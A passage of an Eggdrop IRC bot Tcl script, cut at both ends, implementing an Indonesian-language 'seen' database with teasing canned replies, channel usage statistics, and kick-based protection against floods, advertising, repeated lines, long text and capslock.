    if {$output == "No Matches!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
    if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
    regsub -all -- ~ $output "" output
    if {![string match "*c*" [getchanmode $chan]]} { puthlp "$target :$nick: $output" } { puthlp "$target :$nick: [netext [uncolor $output]]" }
    return $bs(logqueries)
  }
  set data [bs_filt [netext [string trimright [lindex $args 0] ?!.,]]]
  if {[string tolower $nick] == [string tolower $data]} { seenself $nick $uhost $hand $chan ; return $bs(logqueries) }
  if {[string tolower $data] == [string tolower $botnick]} { seenme $nick $uhost $hand $chan ; return $bs(logqueries) }
  if {[onchan $data $chan]} { if {![string match "*c*" [getchanmode $chan]]} { puthlp "$target :$nick:5 $data ada disini." } { puthlp "$target :$nick: [uncolor $data] ada disini." } ; return $bs(logqueries) }
  set output [bs_output $chan $nick $data $no]
  if {$output == 0} {return 0}
  if {[lrange [split $output] 1 4] == "$botnick gak pernah ketemu."} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
  regsub -all -- ~ $output "" output
  if {![string match "*c*" [getchanmode $chan]]} { puthlp "$target :$nick: $output" } { puthlp "$target :$nick: [netext [uncolor $output]]" }
  return $bs(logqueries)
}
proc randomline {text} { return [lindex $text [rand [llength $text]]] }
proc seenself {nick uhost hand chan} { 
  global botnick seenself
  set outmsg [randomline $seenself(comments)] ; regsub -all {\$botnick} $outmsg $botnick outmsg ; regsub -all {\$nick} $outmsg $nick outmsg
  regsub -all {\\001} $outmsg \001 outmsg ; regsub -all {\\002} $outmsg \002 outmsg ; putserv "privmsg $chan :$outmsg"
}
proc seenme {nick uhost hand chan} { 
  global botnick seenme
  set outmsg [randomline $seenme(comments)] ; regsub -all {\$botnick} $outmsg $botnick outmsg ; regsub -all {\$nick} $outmsg $nick outmsg
  regsub -all {\\001} $outmsg \001 outmsg ; regsub -all {\\002} $outmsg \002 outmsg ; putserv "privmsg $chan :$outmsg"
}
set seenme(comments) {
  {$nick, $botnick is here!!}
  {you found me $nick :D}
  {$nick, too bright for ur eyes ha !?}
  {$nick, what ?}
  {$nick, ya ?}
  {$nick, yo wuzz up!}
  {$nick, kick niy !!}
  {\001ACTION slaps $nick with a machine-gun. Open ur eyes!\001}
  {\001ACTION ignore $nick *\001}
  {\001ACTION cuekin $nick *\001}
  {\001ACTION slaps $nick *\001}
  {\001ACTION smackdown $nick *\001}
  {\001ACTION tabok $nick *plak*\001}
  {\001ACTION toelï¿½ $nick *\001}
  {\001ACTION keplak $nick *plak*\001}
  {\001ACTION sundut $nick *\001}
  {\001ACTION tendang $nick *\001}
  {are you blind $nick ?}
  {$nick pasti ga tau kl $botnick bot :p}
  {im here $nick..}
  {$nick, Try to look at the nicklist again.}
  {is there something in ur eyes $nick ?}
  {$nick, type /msg $botnick hai}
  {$nick, type /w $botnick}
  {$nick, kamu buta ya ?}
  {$nick, apaan ?}
  {$nick brisik!!}
  {$nick pasti kangen nyariin $botnick :*}
  {nyariin $botnick emang $nick dah sanggup bayar utangnya ?}
  {$nick <-- penggemar $botnick :D}
  {\001ACTION slap $nick with a machine-gun. Open ur eyes!\001}
  {\001ACTION tabokin $nick pake sandal jepit, Melek !!\001}
  {\001ACTION kasih $nick kacamata *\001}
  {\001ACTION kasih $nick teleskop *\001}
  {\001ACTION kasih kaca mata ke $nick *\001}
  {\001ACTION give $nick a telescope\001}
  {\001ACTION sets mode: +b $nick *\001}
  {\001ACTION give $nick a glasses *\001}
  {\001ACTION cemplungin $nick ke sumur *\001}
  {\001ACTION timpuk $nick *BleTaXs!*\001}
}
set seenself(comments) {
  {Do you have multiple personality problem $nick ?}
  {$nick, Have you seen the mirror lately ?}
  {$nick, elo nyariin sapa ?? ngaca dong !}
  {$nick, sepertinya $nick sedang mengalami krisis identitas :D}
  {$nick, kamu kan ada disini sekarang!}
  {$nick, i havent seen $nick. Do you ?}
  {$nick, nick $nick is too ugly, my seen system doesnt save those kinda nick :p}
  {$nick, Found ya !!}
  {$nick, kasian ga ada yang nyariin ya ?}
  {$nick, Looking for ur self ?}
  {$nick, Loose ur self, or should i said lost ?}
  {$nick, Shut Up!}
  {$nick, seen who ?}
  {$nick, Have you taken your medication today?}
  {$nick Go look in the mirror}
  {$nick pulang dari salon ya ?}
  {muke loe di taruh dimane $nick?}
  {\001ACTION slap $nick around a bit with a large Monitor, WAke UP!!\001}
  {\001ACTION kasih cermin ke $nick *\001}
  {\001ACTION give $nick a mirror *\001}
}
proc bs_output {chan nick data no} {
  global botnick bs version bs_list
  set data [netext [string trimright [lindex $data 0] ?!.,]]
  if {$data == ""} {return 0}
  if {[string tolower $nick] == $data} {return [concat $nick, coba liat kekaca.]}
  if {$data == [string tolower $botnick]} {return [concat $botnick disini. Buang? waktu aja!]}
  if {[string length $data] > $bs(nicksize)} {return 0} 
  if {$bs(smartsearch) != 1} {set no 1}
  if {$no == 0} {
    set matches ""
    set hand ""
    set addy ""
    if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
      set addy [lindex $bs_list([string tolower $data]) 1] 
      set hand [finduser $addy]
      foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
    }
    if {[validuser $data]} {set hand $data}
    if {$hand != "*" && $hand != ""} {
      if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
      foreach addr $hosts { foreach item [string tolower [bs_seenmask dcc ? $addr]] { if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]} } }
    }
    if {$matches != ""} {
      set matches [string trimleft $matches " "]
      set len [llength $matches]
      if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
      if {$len > 999} {return [concat $botnick nemuin5 $len nick sesuai permintaan, silahkan cari sendiri yg lo mau. $botnick capek!!]}
      set matches [bs_sort $matches]
      set key [lindex $matches 0]
      if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
      if {$len <= 5} {
        set output [concat ada5 $len data yang paling mendekati : [join $matches].]
        set output [concat $output [bs_search $chan $key]]
        return $output
        } {
        set output [concat $botnick nemuin5 $len nick sesuai permintaan (secara urut): [join [lrange $matches 0 4]].]
        set output [concat $output [bs_search $chan $key]]
        return $output
  } } }
  set temp [bs_search $chan $data]
  if {$temp != 0} { return $temp } { if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { return "$botnick gak pernah liat5 $data"
      } {
      set seen [getuser $data laston]
      if {[getuser $data laston] == ""} {return "$botnick gak pernah liat $data"}
      if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} { set chan "-secret-" } { set chan [lindex $seen 1] }
      return [concat 5 $data keliatan di 5[string trimleft $chan "#"] [bs_when [lindex $seen 0]] yg lalu.]
} } }
proc bs_search {chan n} {
  global bs_list botnick ; if {![info exists bs_list]} {return 0}
  if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
    set data [split $bs_list([netext [string trimright [string tolower $n] ?!.,]])]
    set n [join [lindex $data 0]] ; set addy [lindex $data 1] ; set time [lindex $data 2] ; set marker 0
    if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} { set chan "-secret-" } { set chan [lindex $data 4] }
    switch -- [lindex $data 3] {
      part { set reason [lrange $data 5 e] ; if {$reason == ""} {set reason "."} {set reason " dgn pesan \"$reason\"."} ; set output [concat 5$n ($addy) keliatan keluar dari 5[string trimleft $chan "#"] [bs_when $time] yg lalu$reason] }
      quit { set output [concat 5$n ($addy) keliatan keluar dari 5[string trimleft $chan "#"] [bs_when $time] yg lalu dgn pesan ([join [lrange $data 5 e]]).] }
      kick { set output [concat 5$n ($addy) dikick oleh5 [lindex $data 5] dari 5[string trimleft $chan "#"] [bs_when $time] yg lalu dgn alasan ([join [lrange $data 6 e]]).] }
      rnck { set output [concat 5$n ($addy) keliatan ganti nick5 [lindex $data 5] di 5[string trimleft [lindex $data 4] "#"] [bs_when $time] yg lalu.] ; if {[validchan [lindex $data 4]]} { if {[onchan $n [lindex $data 4]]} { set output [concat $output 5$n masih disana!] } { set output [concat $output $botnick gak liat5 $n sekarang.] } } }
      nick { set output [concat 5$n ($addy) keliatan ganti nick5 [lindex $data 5] di 5[string trimleft [lindex $data 4] "#"] [bs_when $time] yg lalu.] }
      splt { set output [concat 5$n ($addy) keliatan keluar 5[string trimleft $chan "#"] coz split [bs_when $time] yg lalu.] }
      rejn { set output [concat 5$n ($addy) keliatan masuk kembali di 5[string trimleft $chan "#"] setelah split [bs_when $time] yg lalu.] ; if {[validchan $chan]} {if {[onchan $n $chan]} {set output [concat $output 5$n masih di 5[string trimleft $chan "#"].]} {set output [concat $output $botnick gak liat5 $n di 5[string trimleft $chan "#"] sekarang.]}} }
      join { set output [concat 5$n ($addy) keliatan masuk 5[string trimleft $chan "#"] [bs_when $time] yg lalu.] ; if {[validchan $chan]} {if {[onchan $n $chan]} {set output [concat $output 5$n masih di 5[string trimleft $chan "#"].]} {set output [concat $output $botnick gak liat5 $n di 5[string trimleft $chan "#"] sekarang.]}} }
      away { set reason [lrange $data 5 e] ; if {$reason == ""} { set output [concat 5$n ($addy) keliatan masuk di partyline5 $chan [bs_when $time] yg lalu.] } { set output [concat 5$n ($addy) keliatan lagi away ($reason) di5 $chan [bs_when $time] yg lalu.] } }
      chon { set output [concat 5$n ($addy) keliatan masuk partyline [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  $n didalam pastyline sekarang.] ; set marker 1 ; break}} ; if {$marker == 0} {set output [concat $output $botnick gak liat $n didalam partyline sekarang.]} }
      chof { set output [concat 5$n ($addy) keliatan keluar partyline [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  5$n masih didalam partyline [lindex $item 1] still.] ; break}} }
      chjn { set output [concat 5$n ($addy) keliatan masuk partyline di5 $chan [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  5$n masih didalam partyline sekarang.] ; set marker 1 ; break}} ; if {$marker == 0} {set output [concat $output $botnick gak liat5 $n didalam partyline sekarang.]} }
      chpt { set output [concat 5$n ($addy) keliatan keluar pertyline dari5 $chan [bs_when $time] yg lalu.] ; set lnick [string tolower $n] ; foreach item [whom *] {if {$lnick == [string tolower [lindex $item 0]]} {set output [concat $output  5$n masih didalam partyline [lindex $item 1] still.] ; break}} }
      default {set output "error"}
    } ; return $output
  } {return 0}
}
proc bs_when {lasttime} {
  set bsyears 0
  set bsdays 0
  set bshours 0
  set bsmins 0
  set time [expr [unixtime] - $lasttime]
  if {$time < 60} {return "$time detik"}
  if {$time >= 31536000} { set bsyears [expr int([expr $time/31536000])] ; set time [expr $time - [expr 31536000*$bsyears]] }
  if {$time >= 86400} { set bsdays [expr int([expr $time/86400])] ; set time [expr $time - [expr 86400*$bsdays]] }
  if {$time >= 3600} { set bshours [expr int([expr $time/3600])] ; set time [expr $time - [expr 3600*$bshours]] }
  if {$time >= 60} { set bsmins [expr int([expr $time/60])] }
  if {$bsyears == 0} { set output "" } elseif {$bsyears == 1} { set output "1 tahun," } { set output "$bsyears tahun," }
  if {$bsdays == 1} {lappend output "1 hari,"} elseif {$bsdays > 1} {lappend output "$bsdays hari,"}
  if {$bshours == 1} {lappend output "1 jam,"} elseif {$bshours > 1} {lappend output "$bshours jam,"}
  if {$bsmins == 1} {lappend output "1 menit"} elseif {$bsmins > 1} {lappend output "$bsmins menit"}
  return [string trimright [join $output] ", "]
}
proc bs_add {nick data} {
  global bs_list bs
  if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
  set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc bs_lsortcmd {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc bs_trim {min h d m y} {
  global bs bs_list
  if {![info exists bs_list] || ![array exists bs_list]} {return} 
  set list [array names bs_list]
  set range [expr [llength $list] - $bs(limit) - 1] 
  if {$range < 0} {return}
  set list [lsort -increasing -command bs_lsortcmd $list]
  foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc bs_seenmask {ch nick args} {
  global bs_list bs notc botnick
  set matches "" ; set temp "" ; set i 0 ; set args [join $args] ; set chan [lindex $args 1] ; if {$chan != "" && [string trimleft $chan #] != $chan} { if {![validchan $chan]} {return "$botnick ga di 5[string trimleft $chan "#"]."} {set chan [string tolower $chan]} } { set chan "" }
  if {![info exists bs_list]} {return "Tidak ada persamaan ditemukan."} 
  set data [bs_filt [netext [string trimright [string tolower [lindex $args 0]] ?!.,]]]
  set maskfix 1
  while $maskfix {
    set mark 1
    if [regsub -all -- \\?\\? $data ? data] {set mark 0}
    if [regsub -all -- \\*\\* $data * data] {set mark 0}
    if [regsub -all -- \\*\\? $data * data] {set mark 0}
    if [regsub -all -- \\?\\* $data * data] {set mark 0}
    if $mark {break}
  }
  set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$item == ""} {continue} 
    set i 0
    set temp ""
    set match [lindex $bs_list($item) 0] 
    set addy [lindex $bs_list($item) 1]
    if {[string match $data $item![string tolower $addy]]} { set match [bs_filt $match] ; if {$chan != ""} { if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]} } {set matches [concat $matches $match]} }
  }
  array donesearch bs_list $id
  set matches [string trim $matches " "]
  if {$nick == "?"} {return [bs_filt $matches]}
  set len [llength $matches]
  if {$len == 0} {return "Tidak ada persamaan ditemukan."}
  if {$len == 1} {return [bs_output $ch $nick $matches 1]}
  if {$len > 999} {return "$botnick nemuin5 $len nick sesuai permintaan; silahkan cari sendiri. Capek nih!"}
  set matches [bs_sort $matches]
  if {$len <= 5} {
    set output [concat $botnick temukan5 $len nick sesuai permintaan (secara urut): [join $matches].]
  } { set output "$botnick temukan5 $len nick sesuai permintaan. Ini5 5 nick terakhir (secara urut): [join [lrange $matches 0 4]]." }
  return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
}
proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc bs_dccstats {hand idx args} {putdcc $idx "[bs_stats]"; return 1}
proc bs_pubstats {nick uhost hand chan args} {
  global bs ; if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1)} {return 0}
  if {[lsearch -exact $bs(quiet_chan) [string tolower $chan]] >= 0} {set target "notice $nick"} {set target "privmsg $chan"} ; puthelp "$target :[bs_stats]" ; return 1
}
proc bs_msgstats {nick uhost hand args} {global bs ; if {[bs_flood $nick $uhost]} {return 0} ; puthelp "notice $nick :[bs_stats]" ; return $bs(logqueries)}
proc bs_stats {} {
  global bs_list bs botnick ; set id [array startsearch bs_list] ; set bs_record [unixtime] ; set totalm 0 ; set temp ""
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    set tok [lindex $bs_list($item) 2] ; if {$tok == ""} {putlog "Damaged seen record: $item" ; continue}
    if {[lindex $bs_list($item) 2] < $bs_record} {set bs_record [lindex $bs_list($item) 2] ; set name $item}
    set addy [string tolower [maskhost [lindex $bs_list($item) 1]]] ; if {[lsearch -exact $temp $addy] == -1} {incr totalm ; lappend temp $addy}
  }
  array donesearch bs_list $id
  return "Sampai saat ini $botnick mencatat5 [array size bs_list]/$bs(limit) nick, yang terdiri dari5 $totalm unique uhosts. Data paling lama adalah5 [lindex $bs_list($name) 0]'s, tercatat [bs_when $bs_record] yg lalu."
}
proc bs_dccchanstats {hand idx args} {
  if {$args == "{}"} {set args [console $idx]}  
  if {[lindex $args 0] == "*"} {putdcc $idx "$hand, chanstats requires a channel arg, or a valid console channel." ; return 1}
  putdcc $idx "[bs_chanstats [lindex $args 0]]"
  return 1
}
proc bs_pubchanstats {nick uhost hand chan args} {
  global bs notc ;  if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  set chantarget $chan
  if {$args == "{}"} { set chan $chan } { set chan [lindex $args 0] }
  if {[string first # $chan] != 0} { set chan "#$chan" }
  set chan [string tolower $chan]
  if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) $chan] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1)} {return 0}
  if {[lsearch -exact $bs(quiet_chan) $chan] >= 0} {set target "notice $nick"} {set target "privmsg $chantarget"}
  if {[lindex $args 0] != ""} {set chan [lindex $args 0]} ; puthelp "$target :[bs_chanstats $chan]" ; return $bs(logqueries)
}
proc bs_msgchanstats {nick uhost hand args} {global bs ; if {[bs_flood $nick $uhost]} {return 0} ; puthelp "notice $nick :[bs_chanstats [lindex $args 0]]" ; return $bs(logqueries)}
proc bs_chanstats {chan} {
  global bs_list ; set chan [string tolower $chan] ; if {![validchan $chan]} {return "I'm not on $chan."}
  set id [array startsearch bs_list] ; set bs_record [unixtime] ; set totalc 0 ; set totalm 0 ; set temp ""
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id] ; set time [lindex $bs_list($item) 2] ; if {$time == ""} {continue}
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {
      if {$time < $bs_record} {set bs_record $time} ; incr totalc
      set addy [string tolower [maskhost [lindex $bs_list($item) 1]]]
      if {[lsearch -exact $temp $addy] == -1} {incr totalm ; lappend temp $addy}
  } }
  array donesearch bs_list $id ; set total [array size bs_list]
  return "5[string trimleft $chan "#"] menggunakan5 [expr 100*$totalc/$total]% ($totalc/$total) dari seen database. Tercatat ada5 $totalm unique uhost sejak [bs_when $bs_record] terakhir."
}
foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
proc bs_join_botidle {nick uhost hand chan} { global bs_botidle botnick ; if {$nick == $botnick} { set bs_botidle([string tolower $chan]) [unixtime] } }
proc lastspoke {nick uhost hand chan args} {
  global bs botnick bs_botidle ; if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  set chan [string tolower $chan] ; if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) $chan] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) $chan] == -1)} {return 0}
  if {[lsearch -exact $bs(quiet_chan) $chan] >= 0} {set target "notice $nick"} {set target "privmsg $chan"}
  set data [lindex [bs_filt [join $args]] 0]
  set ldata [string tolower $data] 
  if {[string match *\** $data]} {
    set chanlist [string tolower [chanlist $chan]]
    if {[lsearch -glob $chanlist $ldata] > -1} {set data [lindex [chanlist $chan] [lsearch -glob $chanlist $ldata]]}
  }
  if {[onchan $data $chan]} { 
    if {$ldata == [string tolower $botnick]} {puthelp "$target :$nick, buang? waktu aja :p" ; return 1}
    set time [getchanidle $data $chan] ; set bottime [expr ([unixtime] - $bs_botidle($chan))/60]
    if {$time < $bottime} {
      if {$time > 0} {set diftime [bs_when [expr [unixtime] - $time*60 -15]]} {set diftime "kurang dari semenit"}
      puthelp "$target :5$data terakhir bicara di 5[string trimleft $chan "#"] $diftime yang lalu."
      } {
      set diftime [bs_when $bs_botidle($chan)]
      puthelp "$target :$data terakhir bicara di 5[string trimleft $chan "#"] $diftime yang lalu."
  } }
  return 1
} 
proc bs_help_msg_seen {nick uhost hand args} {
  global bs ; if {[bs_flood $nick $uhost]} {return 0}
  puthelp "notice $nick :###  seen <query> \[chan\]          $bs(version)"
  puthelp "notice $nick :   Queries can be in the following formats:"
  puthelp "notice $nick :     'regular':  seen lamer; seen lamest "
  puthelp "notice $nick :     'masked':   seen *l?mer*; seen *.lame.com; seen *.edu #mychan" ; return 0
}
proc bs_help_msg_chanstats {nick uhost hand args} {
  global bs ; if {[bs_flood $nick $uhost]} {return 0}
  puthelp "notice $nick :###  chanstats <chan>          $bs(version)"
  puthelp "notice $nick :   Returns the usage statistics of #chan in the seen database." ; return 0
}
proc bs_help_msg_seenstats {nick uhost hand args} {
  global bs ; if {[bs_flood $nick $uhost]} {return 0}
  puthelp "notice $nick :###  seenstats          $bs(version)"
  puthelp "notice $nick :   Returns the status of the bseen database." ; return 0
}
proc bs_version {hand idx args} {global bs ; putidx $idx "###  Bass's Seen script, $bs(version)."}
proc bs_help_dcc {hand idx args} {
  global bs
  switch -- $args {
    seen {
      putidx $idx "###  seen <query> \[chan\]          $bs(version)" ; putidx $idx "   Queries can be in the following formats:"
      putidx $idx "     'regular':  seen lamer; seen lamest " ; putidx $idx "     'masked':   seen *l?mer*; seen *.lame.com; seen *.edu #mychan"
    }
    seennick {putidx $idx "###  seen <nick>          $bs(version)"}
    chanstats {putidx $idx "###  chanstats <chan>" ; putidx $idx "   Returns the usage statistics of #chan in the seen database."}
    seenstats {putidx $idx "###  seenstats          $bs(version)" ; putidx $idx "   Returns the status of the bseen database."}
    unseen {if {[matchattr $hand n]} {putidx $idx "###  unseen <chan>          $bs(version)" ; putidx $idx "   Deletes all <chan> entries from the bseen database."}}
    default {*dcc:help $hand $idx [join $args] ; return 0} 
  } ; return 1
}
## bseen update
bind dcc n|- unseen bs_unseen
bind pub n|- !unseen bs_pubunseen
proc bs_unseen {hand idx args} {
  global bs_list
  set tot 0 ; set chan [string tolower [lindex $args 0]] ; set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {incr tot ; lappend remlist $item}
  }
  array donesearch bs_list $id ; if {$tot > 0} {foreach item $remlist {unset bs_list($item)}}
  putlog "$hand removed $chan from the bseen database.  $tot entries removed."
  putidx $idx "$chan successfully removed.  $tot entries deleted from the bseen database."
}
proc bs_pubunseen {nick uhost hand chan args} {
  global bs_list notc
  set tot 0 ; set targetch $chan
  if {$args == "{}"} { set chan $chan } { set chan [lindex $args 0] }
  if {[string first # $chan] != 0} { set chan "#$chan" }
  if {![validchan $chan]} { puthlp "NOTICE $nick :NoT IN $chan" ; return 0 }
  set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$chan == [string tolower [lindex $bs_list($item) 4]]} {incr tot ; lappend remlist $item}
  }
  array donesearch bs_list $id ; if {$tot > 0} {foreach item $remlist {unset bs_list($item)}}
  putquick "PRIVMSG $targetch :05$tot data dihapus dari database channel 5[string trimleft $chan "#"]."
}
bind dcc -|- seen bs_dccreq1
bind dcc -|- seennick bs_dccreq2
proc bs_dccreq1 {hand idx args} {bs_dccreq $hand $idx $args 0}
proc bs_dccreq2 {hand idx args} {bs_dccreq $hand $idx $args 1}
proc bs_dccreq {hand idx args no} {
  set args [bs_filt [join $args]] ; global bs
  if {[string match *\\\** [lindex $args 0]]} {
    set output [bs_seenmask dcc $hand $args]
    if {$output == "No matches were found."} {putallbots "bs_botsearch 0 $idx $hand $args"}
    if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 0 $idx $hand $args"}
    putdcc $idx $output ; return $bs(logqueries)
  }
  set search [bs_filt [lindex $args 0]]
  set output [bs_output dcc $hand $search $no]
  if {$output == 0} {return 0}
  if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 0 $idx $hand $args"}
  putdcc $idx "$output" ; return $bs(logqueries)
}
## seen.tcl lastseen

bind pubm - * repeat_pubm
bind ctcp - ACTION action_chk
proc action_chk {nick host hand chan keyword arg} {
  global botnick
  if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
  if {![validchan $chan]} { if {[matchattr $nick Z]} { set arg "`$arg" ; msg_prot $nick $host $hand $arg } { msg_prot $nick $host $hand $arg } } { if {[matchattr $nick Z]} { set arg "@$arg" ; repeat_pubm $nick $host $hand $chan $arg } { repeat_pubm $nick $host $hand $chan $arg } } }
proc repeat_pubm {nick uhost hand chan text} {
  global repeat_last botnick notb notc kops squ owner ismaskhost is_m
  global botnick capsnick deopme repeat_person quick bannick notm advwords
  regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
  regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
  regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
  pub_Z $nick $uhost $hand $chan $text
  set cflag "c$chan" ; set cflag [string range $cflag 0 8]
  set real $text ; set text [uncolor $text]
  if {$nick == "ChanServ"} { if {[string match "*has deopped $botnick*" $text]} { if {![matchattr [lindex $text 0] f]} { if {[matchattr $cflag D]} { set deopme [lindex $text 0] } } } ; return 0 }
  if {[matchattr $nick f] || $nick == $botnick} { return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  set resume "T"
  if {[string match "*-greet*" [channel info $chan]]} { set resume "F" }
  if {![isop $botnick $chan]} { set resume "F" }
  if {![info exists kops]} { if {[isop $nick $chan]} { set resume "F" } }
  # Tsunami Flood PRoTECTION
  if {[string length $text] > 100} {
    set chr 0
    set cnt 0
    while {$cnt < [string length $real]} { if [isflood [string index $real $cnt]] { incr chr } ; incr cnt }
    if {$chr > 30} {
      if {$resume == "T"} {
        set bannick($nick) "$mhost"
putlog "tsunami from $nick $mhost in $chan"
        if {![isutimer "TsunamI $chan"]} { utimer 30 [list putlog "TsunamI $chan"] } elseif {[info exists ismaskhost]} { set bannick($nick) [maskhost "$mhost"] }
        if {$quick == "1" && ![info exists is_m($chan)]} { putsrv "KICK $chan $nick :1abusing 2messages" } { putserv "KICK $chan $nick :1abusing 2messages" }
      }
      return 0
  } }
  if {![info exists kops]} { if {$resume == "F"} { return 0 } }
  if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} { putsrv "KICK $chan $nick :1go look in a 2mirror" ; return 0 }
  if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
    foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $text]]} { return } }
    foreach seekchan $text { if {[string match "*#*" $seekchan]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :1dont 2invited1 match from 2$seekchan" } } 
  }
  foreach advword [string tolower $advwords] {
    if {[string match *$advword* [string tolower $text]]} {
      if {[string match "*evochat.id*" $text] || [string match "*wwww*" $text] || [string match "*www..*" $text] || [string match "*dns*" $text] || [string match "*ip*" $text] || [string match "*info*" $text] || [string match "*seen*" $text]} { return 0 }
      set bannick($nick) "$uhost"
      putsrv "KICK $chan $nick :1dont 2advertise1 in 2[string trimleft $chan "#"] 1match from 2$advword"
      return 0
  } }
  if {[matchattr $cflag R]} {
    if {[info exists repeat_last($mhost$chan)]} {
      if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
        if {![info exists repeat_person($mhost$chan)]} { set repeat_person($mhost$chan) 1 } { incr repeat_person($mhost$chan) }
        if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"] && ![isop $nick $chan]}  {
          set bannick($nick) "$uhost"
          putserv "KICK $chan $nick :1repeat from 2$mhost 1max2 [getuser $cflag XTRA "RPT"]"
          catch {unset repeat_person($mhost$chan)}
          catch {unset repeat_last($mhost$chan)}
          return 0
    } } }
    set repeat_last($mhost$chan) $text
  }
  if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
    catch {unset repeat_person($mhost$chan)}
    catch {unset repeat_last($mhost$chan)}
    set bannick($nick) "$uhost"
    if {![isutimer "OL $chan"]} {
      utimer 10 [list putlog "OL $chan"] 
      putsrv "KICK $chan $nick :1abusing 2long text 1max2 [getuser $cflag XTRA "CHAR"]1 char"
    } { putsrv "KICK $chan $nick :1abusing 2long text 1max2 [getuser $cflag XTRA "CHAR"]1 char" }
    return 0
  }
  if {[matchattr $cflag U]} {
    set len [string length $text]
    if {[isbad $nick $uhost $chan $text]} { return 0 }
    if {$len < 30} { return 0 }
    set cnt 0
    set capcnt 0
    while {$cnt < $len} { if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} { incr capcnt } ; incr cnt }
    if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
      if {![info exists capsnick($nick)]} {
        putsrv "KICK $chan $nick :stop used 2capslock1 exceed2 [getuser $cflag XTRA "CAPS"]%"
        set capsnick($nick) "1"
        return 0
      }
      set bannick($nick) "$uhost"
      putsrv "KICK $chan $nick :dont used 2capslock1 exceed2 [getuser $cflag XTRA "CAPS"]%"
      unset capsnick($nick)
} } }
proc isupper {letter} { set caps {A B C D E F G H I J K L M N O P Q R S T U V W X Y Z} ; if {[lsearch -exact $caps $letter] > -1} { return 1 } else { return 0 } }
proc isflood {letter} { set caps {! @ # $ % ^ & * ( ) | [ ] < > / \ =    } ; if {[lsearch -exact $caps $letter] > -1} { return 1 } else { return 0 } }
proc isbad {nick uhost chan arg} {
  global badwords botnick notc bannick
  set arg [netext [string tolower $arg]]
  if {[string match "*-greet*" [channel info $chan]]} { set isbad 0 ; return 0 }
  foreach badword [string tolower $badwords] {
